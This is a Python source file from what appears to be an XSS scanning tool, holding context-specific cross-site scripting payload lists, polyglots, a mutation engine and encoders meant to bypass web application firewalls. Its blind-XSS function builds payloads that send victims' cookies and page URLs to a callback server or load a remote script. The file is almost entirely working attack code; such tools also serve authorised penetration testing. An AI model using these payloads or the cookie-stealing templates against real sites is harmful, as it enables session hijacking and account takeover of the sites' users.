"""
payloads/generator.py
Context-aware, polymorphic XSS payload generator with mutation engine.
Generates payloads tailored to HTML / Attribute / JS / URL / CSS contexts.
"""

import base64
import random
import itertools
import urllib.parse
from typing import List, Tuple

from utils.config import Context
from utils.logger import debug


# ─── Base Payload Libraries ───────────────────────────────────────────────────

_HTML_BASE = [
    "<script>alert(1)</script>",
    "<script>alert`1`</script>",
    "<script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<math href=javascript:alert(1)>click</math>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><animateTransform onbegin=alert(1) attributeName=transform>",
    "<form><input type=submit formaction=javascript:alert(1) value=x>",
    "<button form=f formaction=javascript:alert(1)>x</button><form id=f>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    "<xmp><p title=\"</xmp><svg/onload=alert(1)\">",
    "<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=alert(1)>",
    "<script type=module>alert(1)</script>",
    "<script>import('data:text/javascript,alert(1)')</script>",
]

_ATTR_BASE = [
    "\" onmouseover=\"alert(1)\"",
    "' onmouseover='alert(1)'",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "' onfocus='alert(1)' autofocus='",
    "\" onerror=\"alert(1)\" src=\"x",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\" onclick=\"alert(1)\"",
    "javascript:alert(1)",
    "javascript:alert`1`",
    "\" style=\"animation:x\" onanimationstart=\"alert(1)\"",
    "\"><svg onload=alert(1)>",
    "' style='animation:x' onanimationstart='alert(1)'",
    "\" autofocus onfocus=alert(1) x=\"",
    "`;alert(1)//",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
]

_JS_BASE = [
    "alert(1)",
    "alert`1`",
    "(0,alert)(1)",
    "window['alert'](1)",
    "top['ale'+'rt'](1)",
    "self['ale'+'rt'](1)",
    "globalThis.alert(1)",
    "Function('alert(1)')()",
    "[].constructor.constructor('alert(1)')()",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "eval(atob('YWxlcnQoMSk='))",
    "setTimeout('alert(1)',0)",
    "';alert(1)//",
    "\";alert(1)//",
    "\\';alert(1)//",
    "\\\"alert(1)//",
    "</script><script>alert(1)</script>",
    "${alert(1)}",
    "};alert(1);{",
    "'+alert(1)+'",
    "\"+alert(1)+\"",
]

_TEMPLATE_BASE = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*'7'}}{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    "@{alert(1)}",
    "{%raw%}<script>alert(1)</script>{%endraw%}",
    "[[${alert(1)}]]",
]

_POLYGLOT = [
    (
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
        "%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
        "\\x3csVg/<sVg/oNloAd=alert()//"
    ),
    "'\"--></style></script><script>alert(1)</script>",
    "'\"<img src=x onerror=alert(1)>",
    "<script>alert(1)</script><svg onload=alert(1)><img src=x onerror=alert(1)>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
]


# ─── Encoding Engine ─────────────────────────────────────────────────────────

class Encoder:
    """Apply various encoding transformations to payloads."""

    @staticmethod
    def html_entity(p: str) -> str:
        return "".join(f"&#{ord(c)};" for c in p)

    @staticmethod
    def html_hex(p: str) -> str:
        return "".join(f"&#x{ord(c):x};" for c in p)

    @staticmethod
    def url_encode(p: str) -> str:
        return urllib.parse.quote(p, safe="")

    @staticmethod
    def double_url(p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

    @staticmethod
    def base64_eval(p: str) -> str:
        b = base64.b64encode(p.encode()).decode()
        return f"eval(atob('{b}'))"

    @staticmethod
    def fromcharcode(p: str) -> str:
        codes = ",".join(str(ord(c)) for c in p)
        return f"eval(String.fromCharCode({codes}))"

    @staticmethod
    def unicode_escape(p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in p)

    @staticmethod
    def hex_escape(p: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in p)

    @staticmethod
    def mixed_case(p: str) -> str:
        result = []
        for i, c in enumerate(p):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def null_byte(p: str) -> str:
        """Insert null byte in script keyword."""
        return p.replace("script", "scr\x00ipt").replace("SCRIPT", "SCR\x00IPT")

    @staticmethod
    def comment_break(p: str) -> str:
        """Insert HTML comment inside keywords."""
        return p.replace("script", "scr<!---->ipt").replace("onerror", "on<!---->error")

    @staticmethod
    def tab_newline(p: str) -> str:
        """Replace spaces with tab characters."""
        return p.replace(" ", "\t")


ENCODING_FUNS = [
    ("html_entity",  Encoder.html_entity),
    ("html_hex",     Encoder.html_hex),
    ("url_encode",   Encoder.url_encode),
    ("double_url",   Encoder.double_url),
    ("mixed_case",   Encoder.mixed_case),
    ("null_byte",    Encoder.null_byte),
    ("comment_break",Encoder.comment_break),
    ("tab_newline",  Encoder.tab_newline),
]


# ─── Mutation Engine ─────────────────────────────────────────────────────────

class MutationEngine:
    """
    Generate mutated variants of a base payload by:
    - Case flipping
    - Attribute quote variation
    - Event handler substitution
    - Tag substitution
    - Whitespace insertion
    """

    _EVENT_HANDLERS = [
        "onerror", "onload", "onfocus", "onblur", "onmouseover",
        "onclick", "onmouseenter", "onanimationstart", "onbegin",
        "ontoggle", "onpageshow", "onstart",
    ]

    _TAGS_WITH_EVENTS = [
        "img", "svg", "video", "audio", "body",
        "iframe", "details", "marquee", "input",
    ]

    @classmethod
    def mutate(cls, base: str, count: int = 5) -> List[str]:
        """Return `count` mutations of a base payload."""
        results = set()
        fns = [
            cls._quote_variant,
            cls._case_flip,
            cls._whitespace_insert,
            cls._event_swap,
            cls._bracket_space,
        ]
        random.shuffle(fns)
        for fn in fns:
            try:
                v = fn(base)
                if v and v != base:
                    results.add(v)
                if len(results) >= count:
                    break
            except Exception:
                pass
        return list(results)[:count]

    @staticmethod
    def _quote_variant(p: str) -> str:
        if '"' in p:
            return p.replace('"', "'")
        if "'" in p:
            return p.replace("'", '"')
        return p

    @staticmethod
    def _case_flip(p: str) -> str:
        result = []
        flip = True
        for c in p:
            if c.isalpha():
                result.append(c.upper() if flip else c.lower())
                flip = not flip
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def _whitespace_insert(p: str) -> str:
        """Insert tab between attribute name and =."""
        return p.replace("=alert", "\t=\talert").replace("= alert", "=alert")

    @staticmethod
    def _event_swap(p: str) -> str:
        for ev in MutationEngine._EVENT_HANDLERS:
            if ev in p:
                replacement = random.choice([
                    e for e in MutationEngine._EVENT_HANDLERS if e != ev
                ])
                return p.replace(ev, replacement, 1)
        return p

    @staticmethod
    def _bracket_space(p: str) -> str:
        return p.replace("alert(1)", "alert( 1 )").replace("alert`1`", "alert`1`")


# ─── Context-Aware Payload Generator ─────────────────────────────────────────

class PayloadGenerator:
    """
    Main payload generation interface.

    Usage:
        gen = PayloadGenerator(max_per_ctx=30, waf_bypass=True)
        payloads = gen.for_context(Context.HTML)
    """

    def __init__(self, max_per_ctx: int = 30, waf_bypass: bool = True):
        self.max_per_ctx = max_per_ctx
        self.waf_bypass  = waf_bypass
        self._mutator    = MutationEngine()
        self._encoder    = Encoder()

    def for_context(self, context: str) -> List[Tuple[str, str]]:
        """
        Returns list of (payload, encoding_label) tuples for the given context.
        """
        base = self._base_for_context(context)
        results: List[Tuple[str, str]] = []

        # 1. Raw base payloads
        for p in base:
            results.append((p, "none"))
            if len(results) >= self.max_per_ctx:
                return results

        # 2. Mutations
        for p in base[:10]:
            for m in self._mutator.mutate(p, count=3):
                results.append((m, "mutation"))
                if len(results) >= self.max_per_ctx:
                    return results

        # 3. Encoded variants (if WAF bypass enabled)
        if self.waf_bypass:
            for enc_name, enc_fn in ENCODING_FUNS:
                for p in base[:5]:
                    try:
                        encoded = enc_fn(p)
                        results.append((encoded, enc_name))
                    except Exception:
                        pass
                    if len(results) >= self.max_per_ctx:
                        return results

        # 4. Polyglot payloads
        for p in _POLYGLOT:
            results.append((p, "polyglot"))
            if len(results) >= self.max_per_ctx:
                return results

        return results[:self.max_per_ctx]

    def for_blind_xss(self, callback_url: str) -> List[Tuple[str, str]]:
        """Generate blind XSS payloads that beacon to a callback server."""
        templates = [
            f"<script>new Image().src='{callback_url}?c='+document.cookie+'&u='+document.URL</script>",
            f"<script>fetch('{callback_url}?data='+btoa(document.cookie))</script>",
            f"<script>navigator.sendBeacon('{callback_url}',JSON.stringify({{c:document.cookie,u:location.href}}))</script>",
            f"<script>var x=new XMLHttpRequest();x.open('GET','{callback_url}?c='+document.cookie);x.send()</script>",
            f"<img src=x onerror=\"fetch('{callback_url}?c='+document.cookie)\">",
            f"<svg onload=\"new Image().src='{callback_url}?d='+document.domain\">",
            f"\"><script src='{callback_url}/payload.js'></script>",
        ]
        return [(p, "blind") for p in templates]

    def _base_for_context(self, context: str) -> List[str]:
        mapping = {
            Context.HTML:        _HTML_BASE,
            Context.ATTRIBUTE:   _ATTR_BASE,
            Context.JS:          _JS_BASE,
            Context.JS_STRING:   _JS_BASE,
            Context.JS_TEMPLATE: _TEMPLATE_BASE,
            Context.URL:         _ATTR_BASE[:8] + _HTML_BASE[:5],
            Context.CSS:         [
                "expression(alert(1))",
                "url('javascript:alert(1)')",
                "<style>body{background:url('javascript:alert(1)')}</style>",
                "</style><script>alert(1)</script>",
            ],
            Context.COMMENT:     [
                "--><script>alert(1)</script>",
                "--><img src=x onerror=alert(1)>",
                "--><svg onload=alert(1)>",
            ],
            Context.UNKNOWN:     _HTML_BASE + _ATTR_BASE[:5] + _POLYGLOT,
        }
        return mapping.get(context, _HTML_BASE)
